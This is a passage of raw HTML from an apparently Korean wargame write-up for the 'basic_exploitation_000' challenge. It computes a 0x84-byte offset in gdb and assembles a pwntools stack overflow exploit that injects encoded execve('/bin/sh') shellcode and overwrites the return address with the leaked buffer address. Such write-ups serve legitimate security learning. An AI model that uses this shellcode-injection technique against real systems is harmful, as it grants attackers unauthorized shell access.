&lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x20&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i386&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-2-dump-byte-수-계산&quot;&gt;2. 2. dump byte 수 계산&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;gdb를 이용해 buf 변수에 몇 바이트가 할당되었는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/basic_exploitation_000/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이 부분을 봐도 되고,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/basic_exploitation_000/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이 부분을 봐도 된다. 첫 번째 사진의 경우 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esp&lt;/code&gt;에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0x80&lt;/code&gt;을 더하고 있고(저 시점에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp&lt;/code&gt;==&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esp&lt;/code&gt;이다) 두번째 사진에서는 scanf의 두번째 인자(입력값이 저장될 주소)로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x80&lt;/code&gt;을 하고 있다.&lt;/p&gt;

&lt;p&gt;즉, buf[0]에서부터 ret add까지의 바이트 수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x84 byte&lt;/code&gt;이다.&lt;/p&gt;

&lt;p&gt;따라서 dump byte의 바이트 수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x84-shellcode byte&lt;/code&gt; 가 된다.&lt;/p&gt;

&lt;p&gt;이 점을 반영하기 위해 아래와 같이 코딩했다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;i386&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;linux&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x20&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i386&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-3-ret-address-알아내기&quot;&gt;2. 3. ret address 알아내기&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;주어진 소스를 다시 보면, buf의 시작 주소를 출력해 준다는 것을 알 수 있다. 따라서 프로그램의 출력값을 읽어오는 pwntools의 recv 함수가 필요하다.&lt;/p&gt;

&lt;p&gt;아래와 같이 코딩했다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# receiving data and sending data
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;{target_url}&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# process(&quot;./basic_exploitation_000&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;(&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# constructing payload
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;출력되는 데이터는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf = ({address})&lt;/code&gt; 의 형태일 것이기 때문에 데이터를 받아 소괄호를 기준으로 데이터를 분리해 내는 작업을 하도록 만들었다.&lt;/p&gt;

&lt;p&gt;그런데 사실 더 편리한 방법이 있다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;...(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;생략&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buf = (&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_add&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 0x00000000 format
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;후략&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이렇게 할 걸….&lt;/p&gt;

&lt;p&gt;문제 다 풀고 나서 생각났다……………………&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-익스플로잇-수행&quot;&gt;3. 익스플로잇 수행&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞서 짠 코드들을 전부 조합하면 아래와 같은 익스플로잇이 나온다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# receiving data and sending data
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;{target_url}&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;(&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# constructing payload
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;i386&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;linux&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x20&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i386&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_add&lt;/span&gt;

